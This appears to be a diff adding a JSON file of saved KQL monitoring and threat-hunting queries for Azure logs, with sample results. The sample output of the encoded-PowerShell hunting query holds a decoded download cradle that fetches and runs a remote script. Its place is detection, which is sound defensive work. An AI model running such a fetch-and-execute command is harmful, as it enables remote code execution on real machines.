@@ -1,0 +1,99 @@
+{
+  "version": 1,
+  "queries": [
+    {
+      "id": "7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c01",
+      "title": "Failed sign-ins by user (last 24h)",
+      "status": "works",
+      "tags": ["entra", "signinlogs", "authentication"],
+      "description": "Counts failed interactive sign-ins per user over the last day. Result type 0 is success, everything else is a failure code.",
+      "query": "SigninLogs\n| where TimeGenerated > ago(24h)\n| where ResultType != \"0\"\n| summarize Failures = count(), LastSeen = max(TimeGenerated) by UserPrincipalName, ResultType\n| order by Failures desc\n| take 20",
+      "sampleResults": {
+        "columns": ["UserPrincipalName", "ResultType", "Failures", "LastSeen"],
+        "rows": [
+          ["jdoe@contoso.com", "50126", "14", "2026-10-29T18:42:10Z"],
+          ["svc-backup@contoso.com", "50053", "9", "2026-10-29T17:03:55Z"],
+          ["mchen@contoso.com", "50076", "3", "2026-10-29T12:11:02Z"]
+        ]
+      },
+      "updated": "2026-10-30"
+    },
+    {
+      "id": "7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c02",
+      "title": "Machines that stopped sending heartbeats",
+      "status": "works",
+      "tags": ["heartbeat", "monitoring", "agents"],
+      "description": "Lists computers whose last heartbeat is older than 30 minutes. Useful for spotting agents that are offline or broken.",
+      "query": "Heartbeat\n| summarize LastHeartbeat = max(TimeGenerated) by Computer, OSType\n| where LastHeartbeat < ago(30m)\n| extend MinutesSilent = datetime_diff(\"minute\", now(), LastHeartbeat)\n| order by MinutesSilent desc",
+      "sampleResults": {
+        "columns": ["Computer", "OSType", "LastHeartbeat", "MinutesSilent"],
+        "rows": [
+          ["web-prod-03", "Linux", "2026-10-29T02:15:00Z", "1047"],
+          ["dc-east-01", "Windows", "2026-10-29T18:50:00Z", "52"]
+        ]
+      },
+      "updated": "2026-10-30"
+    },
+    {
+      "id": "7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c03",
+      "title": "Windows 4625 logon failures by source IP",
+      "status": "mostly",
+      "tags": ["securityevent", "windows", "bruteforce"],
+      "description": "Groups failed logons (event 4625) by source address. Works, but IpAddress is often '-' for local logons, so those get lumped together and should be filtered out.",
+      "query": "SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4625\n| summarize Attempts = count(), Accounts = dcount(TargetUserName) by IpAddress, Computer\n| where Attempts > 10\n| order by Attempts desc",
+      "sampleResults": {
+        "columns": ["IpAddress", "Computer", "Attempts", "Accounts"],
+        "rows": [
+          ["203.0.113.57", "rdp-gw-01", "412", "38"],
+          ["-", "fileserver-02", "27", "2"]
+        ]
+      },
+      "updated": "2026-10-30"
+    },
+    {
+      "id": "7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c04",
+      "title": "PowerShell with encoded commands",
+      "status": "works",
+      "tags": ["defender", "deviceprocessevents", "powershell", "hunting"],
+      "description": "Finds PowerShell launches that use -EncodedCommand (or shortened forms) in the last 7 days and decodes the payload for review.",
+      "query": "DeviceProcessEvents\n| where Timestamp > ago(7d)\n| where FileName in~ (\"powershell.exe\", \"pwsh.exe\")\n| where ProcessCommandLine has_any (\"-enc\", \"-EncodedCommand\", \"-e \")\n| extend Encoded = extract(@\"-[eE][nN]?[cC]?[a-zA-Z]*\\s+([A-Za-z0-9+/=]{20,})\", 1, ProcessCommandLine)\n| extend Decoded = base64_decode_tostring(Encoded)\n| project Timestamp, DeviceName, AccountName, Decoded, ProcessCommandLine",
+      "sampleResults": {
+        "columns": ["Timestamp", "DeviceName", "AccountName", "Decoded"],
+        "rows": [
+          ["2026-10-28T09:12:44Z", "laptop-114", "asmith", "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"]
+        ]
+      },
+      "updated": "2026-10-30"
+    },
+    {
+      "id": "7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c05",
+      "title": "CPU utilization trend per computer",
+      "status": "works",
+      "tags": ["perf", "cpu", "timechart"],
+      "description": "Average processor time in 15-minute bins for the last 6 hours, rendered as a time chart.",
+      "query": "Perf\n| where TimeGenerated > ago(6h)\n| where ObjectName == \"Processor\" and CounterName == \"% Processor Time\" and InstanceName == \"_Total\"\n| summarize AvgCpu = avg(CounterValue) by bin(TimeGenerated, 15m), Computer\n| render timechart",
+      "sampleResults": {
+        "columns": ["TimeGenerated", "Computer", "AvgCpu"],
+        "rows": [
+          ["2026-10-30T08:00:00Z", "app-01", "23.4"],
+          ["2026-10-30T08:15:00Z", "app-01", "71.9"],
+          ["2026-10-30T08:00:00Z", "app-02", "12.1"]
+        ]
+      },
+      "updated": "2026-10-30"
+    },
+    {
+      "id": "7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c06",
+      "title": "Azure resource deletions by caller",
+      "status": "broken",
+      "tags": ["azureactivity", "audit", "governance"],
+      "description": "Intended to list who deleted which resources. Currently returns nothing in my workspace, probably because the schema uses OperationNameValue rather than OperationName in newer tables. Needs fixing.",
+      "query": "AzureActivity\n| where TimeGenerated > ago(30d)\n| where OperationName endswith \"delete\"\n| where ActivityStatus == \"Succeeded\"\n| project TimeGenerated, Caller, ResourceGroup, Resource, OperationName\n| order by TimeGenerated desc",
+      "sampleResults": {
+        "columns": ["TimeGenerated", "Caller", "ResourceGroup", "Resource", "OperationName"],
+        "rows": []
+      },
+      "updated": "2026-10-30"
+    }
+  ]
+}
